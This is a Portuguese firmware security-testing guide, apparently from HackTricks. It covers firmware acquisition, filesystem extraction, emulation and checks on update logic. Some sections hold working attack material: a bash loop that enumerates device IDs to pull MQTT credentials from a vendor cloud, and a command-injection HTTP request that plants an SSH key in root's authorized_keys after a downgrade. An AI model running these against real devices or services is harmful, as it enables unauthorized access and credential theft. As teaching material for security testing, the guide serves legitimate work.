# Análise de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introdução**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware é um software essencial que permite que dispositivos operem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com o qual os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo possa acessar instruções vitais desde o momento em que é ligado, levando ao carregamento do sistema operacional. Examinar e, potencialmente, modificar o firmware é uma etapa crítica na identificação de vulnerabilidades de segurança.

## **Coleta de Informações**

**Coleta de informações** é uma etapa inicial crítica para entender a composição de um dispositivo e as tecnologias que ele utiliza. Esse processo envolve a coleta de dados sobre:

- A arquitetura da CPU e o sistema operacional que ele executa
- Especificações do bootloader
- Layout do hardware e fichas técnicas
- Métricas da base de código e locais do código-fonte
- Bibliotecas externas e tipos de licença
- Históricos de update e certificações regulatórias
- Diagramas arquiteturais e de fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para isso, ferramentas de **inteligência open-source (OSINT)** são inestimáveis, assim como a análise de quaisquer componentes de software open-source disponíveis por meio de processos de revisão manuais e automatizados. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) oferecem análise estática gratuita que pode ser aproveitada para encontrar potenciais problemas.

## **Obtenção do Firmware**

Obter o firmware pode ser feito por vários meios, cada um com seu nível de complexidade:

- **Diretamente** da fonte (desenvolvedores, fabricantes)
- **Construindo** a partir das instruções fornecidas
- **Baixando** de sites de suporte oficiais
- Utilizando consultas **Google dork** para encontrar arquivos de firmware hospedados
- Acessando **cloud storage** diretamente, com ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **updates** via técnicas man-in-the-middle
- **Extraindo** do dispositivo através de conexões como **UART**, **JTAG**, ou **PICit**
- **Sniffing** por requisições de update na comunicação do dispositivo
- Identificando e usando **hardcoded update endpoints**
- **Dumping** do bootloader ou da rede
- **Removendo e lendo** o chip de armazenamento, quando tudo mais falhar, usando ferramentas de hardware apropriadas

## Analisando o firmware

Agora que você **tem o firmware**, você precisa extrair informações sobre ele para saber como tratá-lo. Diferentes ferramentas que você pode usar para isso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se você não encontrar muito com essas ferramentas, verifique a **entropia** da imagem com `binwalk -E <bin>`; se a entropia for baixa, então provavelmente não está criptografada. Se for alta, provavelmente está criptografada (ou comprimida de alguma forma).

Além disso, você pode usar essas ferramentas para extrair **arquivos embutidos dentro do firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspecionar o arquivo.

### Obtendo o sistema de arquivos

Com as ferramentas comentadas anteriormente, como `binwalk -ev <bin>`, você deve ter conseguido **extrair o sistema de arquivos**.  
Binwalk geralmente o extrai dentro de uma **pasta com o nome do tipo de sistema de arquivos**, que normalmente é um dos seguintes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extração manual do sistema de arquivos

Às vezes, o binwalk **não terá o byte mágico do sistema de arquivos em suas assinaturas**. Nesses casos, use o binwalk para **encontrar o offset do sistema de arquivos e extrair (carve) o sistema de arquivos comprimido** do binário e **extrair manualmente** o sistema de arquivos de acordo com seu tipo usando os passos abaixo.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Execute o seguinte **dd command** para fazer o carving do Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, o seguinte comando também pode ser executado.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos estarão no diretório "`squashfs-root`" posteriormente.

- Para arquivos CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de arquivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de arquivos ubifs com NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisando Firmware

Depois de obter o firmware, é essencial dissecá-lo para entender sua estrutura e potenciais vulnerabilidades. Esse processo envolve a utilização de várias ferramentas para analisar e extrair dados valiosos da imagem do firmware.

### Ferramentas de Análise Inicial

Um conjunto de comandos é fornecido para a inspeção inicial do arquivo binário (referido como `<bin>`). Esses comandos ajudam a identificar tipos de arquivo, extrair strings, analisar dados binários e entender os detalhes de partição e sistema de arquivos:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para avaliar o estado de criptografia da imagem, a **entropy** é verificada com `binwalk -E <bin>`. Baixa **entropy** sugere ausência de criptografia, enquanto alta **entropy** indica possível criptografia ou compressão.

Para extrair **arquivos embutidos**, recomenda-se usar ferramentas e recursos como a documentação **file-data-carving-recovery-tools** e **binvis.io** para inspeção de arquivos.

### Extraindo o sistema de arquivos

Usando `binwalk -ev <bin>`, normalmente é possível extrair o sistema de arquivos, frequentemente para um diretório nomeado pelo tipo de sistema de arquivos (por exemplo, squashfs, ubifs). Entretanto, quando o **binwalk** não consegue reconhecer o tipo de sistema de arquivos devido à ausência de magic bytes, é necessário fazer a extração manualmente. Isso envolve usar o `binwalk` para localizar o offset do sistema de arquivos, seguido do comando `dd` para esculpir (carve) o sistema de arquivos:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Em seguida, dependendo do tipo de sistema de arquivos (por exemplo, squashfs, cpio, jffs2, ubifs), diferentes comandos são usados para extrair manualmente o conteúdo.

### Análise do sistema de arquivos

Com o sistema de arquivos extraído, começa a busca por falhas de segurança. Atenção é dada a daemons de rede inseguros, credenciais hardcoded, endpoints de API, funcionalidades de servidor de atualização, código não compilado, scripts de inicialização e binários compilados para análise offline.

**Locais-chave** e **itens** a inspecionar incluem:

- **etc/shadow** e **etc/passwd** para credenciais de usuário
- Certificados e chaves SSL em **etc/ssl**
- Arquivos de configuração e scripts em busca de vulnerabilidades potenciais
- Binários embarcados para análise posterior
- Servidores web comuns de dispositivos IoT e binários

Várias ferramentas auxiliam na descoberta de informações sensíveis e vulnerabilidades dentro do sistema de arquivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) para busca de informações sensíveis
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análise abrangente de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), e [**EMBA**](https://github.com/e-m-b-a/emba) para análise estática e dinâmica

### Verificações de segurança em binários compilados

Tanto o código-fonte quanto os binários compilados encontrados no sistema de arquivos devem ser examinados em busca de vulnerabilidades. Ferramentas como **checksec.sh** para binários Unix e **PESecurity** para binários Windows ajudam a identificar binários sem proteção que podem ser explorados.

## Extração de configuração na nuvem e credenciais MQTT via tokens de URL derivados

Muitos hubs IoT buscam a configuração por dispositivo de um endpoint na nuvem que se parece com:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Durante a análise de firmware você pode descobrir que <token> é derivado localmente a partir do device ID usando um segredo embutido, por exemplo:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Esse design permite que qualquer um que descubra um deviceId e a STATIC_KEY reconstrua a URL e obtenha a configuração na nuvem, frequentemente revelando credenciais MQTT em texto plano e prefixos de tópico.

Fluxo de trabalho prático:

1) Extraia o deviceId dos logs de boot via UART

- Conecte um adaptador UART 3.3V (TX/RX/GND) e capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Procure por linhas que exibam o padrão de URL de configuração do cloud e o endereço do broker, por exemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY e algoritmo do token do firmware

- Carregue os binários no Ghidra/radare2 e procure pelo caminho de configuração ("/pf/") ou pelo uso de MD5.
- Confirme o algoritmo (por exemplo, MD5(deviceId||STATIC_KEY)).
- Derive o token no Bash e converta o digest para maiúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Coletar configuração cloud e credenciais MQTT

- Monte a URL e obtenha o JSON com curl; analise com jq para extrair segredos:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusar de MQTT em plaintext e ACLs fracas de tópico (se presentes)

- Use credenciais recuperadas para inscrever-se em tópicos de manutenção e procurar por eventos sensíveis:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivo previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam vendor OUI/product/type bytes seguidos por um sufixo sequencial.
- Você pode iterar IDs candidatos, derivar tokens e buscar configs programaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Sempre obtenha autorização explícita antes de tentar enumeração em massa.
- Prefira emulação ou análise estática para recuperar segredos sem modificar o hardware alvo quando possível.


O processo de emular firmware possibilita **análise dinâmica** tanto da operação de um dispositivo quanto de um programa individual. Essa abordagem pode enfrentar desafios devido a dependências de hardware ou arquitetura, mas transferir o sistema de arquivos root ou binários específicos para um dispositivo com arquitetura e ordem de bytes (endianness) compatíveis, como um Raspberry Pi, ou para uma máquina virtual pré-construída, pode facilitar testes adicionais.

### Emulando Binários Individuais

Para examinar programas isolados, identificar a ordem de bytes (endianness) e a arquitetura de CPU do programa é crucial.

#### Exemplo com arquitetura MIPS

Para emular um binário de arquitetura MIPS, pode-se usar o comando:
```bash
file ./squashfs-root/bin/busybox
```
E para instalar as ferramentas de emulação necessárias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), `qemu-mips` é usado, e para binários little-endian, a escolha seria `qemu-mipsel`.

#### Emulação da Arquitetura ARM

Para binários ARM, o processo é similar, utilizando-se o emulador `qemu-arm`.

### Emulação de Sistema Completo

Ferramentas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), e outras, facilitam a emulação completa de firmware, automatizando o processo e auxiliando na análise dinâmica.

## Análise Dinâmica na Prática

Nesta fase, utiliza-se um ambiente de dispositivo real ou emulado para análise. É essencial manter acesso de shell ao OS e ao filesystem. A emulação pode não reproduzir perfeitamente as interações com o hardware, exigindo reinícios ocasionais da emulação. A análise deve revisitar o filesystem, explorar páginas web e serviços de rede expostos, e investigar vulnerabilidades do bootloader. Testes de integridade do firmware são críticos para identificar possíveis backdoors.

## Técnicas de Análise em Tempo de Execução

A análise em tempo de execução envolve interagir com um processo ou binário em seu ambiente operacional, usando ferramentas como gdb-multiarch, Frida e Ghidra para definir breakpoints e identificar vulnerabilidades por meio de fuzzing e outras técnicas.

## Exploração de Binários e Prova de Conceito

Desenvolver um PoC para vulnerabilidades identificadas requer um entendimento profundo da arquitetura alvo e programação em linguagens de baixo nível. Proteções de runtime para binários em sistemas embarcados são raras, mas quando presentes, técnicas como Return Oriented Programming (ROP) podem ser necessárias.

## Sistemas Operacionais Preparados para Análise de Firmware

Sistemas operacionais como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) fornecem ambientes pré-configurados para testes de segurança de firmware, equipados com as ferramentas necessárias.

## SOs Preparados para Analisar Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS é uma distro destinada a ajudar você a realizar security assessment e penetration testing de dispositivos Internet of Things (IoT). Ela economiza muito tempo fornecendo um ambiente pré-configurado com todas as ferramentas necessárias carregadas.  
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system baseado no Ubuntu 18.04 pré-carregado com ferramentas para firmware security testing.

## Ataques de Downgrade de Firmware e Mecanismos de Atualização Inseguros

Mesmo quando um fornecedor implementa verificações de assinatura criptográfica para imagens de firmware, **a proteção contra version rollback (downgrade) frequentemente é omitida**. Quando o boot- or recovery-loader apenas verifica a assinatura com uma chave pública embutida, mas não compara a *versão* (ou um contador monotônico) da imagem sendo gravada, um atacante pode legitimamente instalar um **firmware mais antigo e vulnerável que ainda possui uma assinatura válida** e assim reintroduzir vulnerabilidades já corrigidas.

Fluxo típico de ataque:

1. **Obtain an older signed image**
   * Grab it from the vendor’s public download portal, CDN or support site.
   * Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
   * Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
   * Web UI, mobile-app API, USB, TFTP, MQTT, etc.
   * Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Exemplo: Command Injection Após Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
No firmware vulnerável (rebaixado), o parâmetro `md5` é concatenado diretamente em um comando de shell sem sanitização, permitindo injeção de comandos arbitrários (aqui – habilitando acesso root via chave SSH). Versões posteriores do firmware introduziram um filtro de caracteres básico, mas a ausência de proteção contra downgrade torna a correção inútil.

### Extraindo firmware de aplicativos móveis

Muitos fabricantes incluem imagens completas de firmware dentro de seus aplicativos móveis acompanhantes para que o app possa atualizar o dispositivo via Bluetooth/Wi‑Fi. Esses pacotes geralmente são armazenados sem criptografia no APK/APEX em caminhos como `assets/fw/` ou `res/raw/`. Ferramentas como `apktool`, `ghidra` ou até o simples `unzip` permitem extrair imagens assinadas sem tocar no hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checklist para Avaliar a Lógica de Atualização

* O transporte/autenticação do *update endpoint* está adequadamente protegido (TLS + autenticação)?
* O dispositivo compara **version numbers** ou um **monotonic anti-rollback counter** antes de gravar?
* A imagem é verificada dentro de uma secure boot chain (e.g. signatures checked by ROM code)?
* O código userland realiza verificações adicionais de sanidade (e.g. allowed partition map, model number)?
* Os fluxos de atualização *partial* ou *backup* reutilizam a mesma lógica de validação?

> 💡  Se algum dos itens acima estiver ausente, a plataforma provavelmente é vulnerável a rollback attacks.

## Firmwares vulneráveis para praticar

Para praticar a descoberta de vulnerabilidades em firmware, use os seguintes projetos de firmware vulneráveis como ponto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referências

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Treinamento e Certificação

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
